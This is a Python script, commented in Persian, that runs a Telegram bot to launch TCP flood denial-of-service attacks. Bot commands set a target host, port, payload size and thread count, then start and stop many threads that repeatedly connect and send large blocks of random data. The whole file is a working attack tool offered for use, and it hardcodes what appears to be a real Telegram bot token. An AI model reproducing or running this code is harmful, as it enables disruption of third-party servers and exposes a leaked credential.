import socket
import threading
import random
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from termcolor import colored

# ذخیره‌سازی حمله‌های فعال
attack_instances = {}

class TCPFlood:
    def __init__(self, target, port, payload_size, threads):
        self.target = target
        self.port = port
        self.payload_size = payload_size * 1024 * 1024  # تبدیل مگابایت به بایت
        self.threads = threads
        self.running = False

    def attack(self):
        """اجرای حمله TCP به هدف"""
        self.running = True
        large_data = random._urandom(self.payload_size)

        def send_packets():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    sock.sendall(large_data)
                    sock.close()
                    print(colored(f"✅ Packet sent to {self.target}:{self.port}", 'green'))
                except Exception as e:
                    print(colored(f"❌ Error: {e}", 'red'))

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=send_packets)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def stop(self):
        """توقف حمله"""
        self.running = False
        print(colored("❌ Attack stopped!", 'red'))

# دستورات ربات
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Use /target to set the target and /fire to start the attack.")

async def target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تنظیم هدف"""
    if len(context.args) < 4:
        await update.message.reply_text("Usage: /target [IP/URL] [PORT] [PAYLOAD_SIZE_MB] [THREADS]")
        return

    target = context.args[0]
    port = int(context.args[1])
    payload_size = int(context.args[2])
    threads = int(context.args[3])

    # ایجاد نمونه TCPFlood
    attack_instances[update.effective_chat.id] = TCPFlood(target, port, payload_size, threads)
    await update.message.reply_text(f"🎯 Target set to {target}:{port}\nPayload Size: {payload_size} MB\nThreads: {threads}\nUse /fire to start the attack.")

async def fire(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """شروع حمله"""
    chat_id = update.effective_chat.id
    if chat_id not in attack_instances:
        await update.message.reply_text("❌ No target set. Use /target first.")
        return

    attack = attack_instances[chat_id]

    # اجرای حمله در یک نخ جداگانه
    attack_thread = threading.Thread(target=attack.attack)
    attack_thread.start()
    await update.message.reply_text("🔥 Attack started!")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """توقف حمله"""
    chat_id = update.effective_chat.id
    if chat_id not in attack_instances:
        await update.message.reply_text("❌ No ongoing attack to stop.")
        return

    attack = attack_instances[chat_id]
    attack.stop()
    await update.message.reply_text("❌ Attack stopped!")

# تابع اصلی
async def main():
    # مقدار توکن ربات تلگرام را اینجا وارد کنید
    bot_token = '7712105596:AAFFBCmu1UWc_rf66H8F4NyhHLX4FKfE0LY'

    # ایجاد اپلیکیشن
    app = ApplicationBuilder().token(bot_token).build()

    # افزودن دستورات
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('target', target))
    app.add_handler(CommandHandler('fire', fire))
    app.add_handler(CommandHandler('stop', stop))

    # اجرا
    await app.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
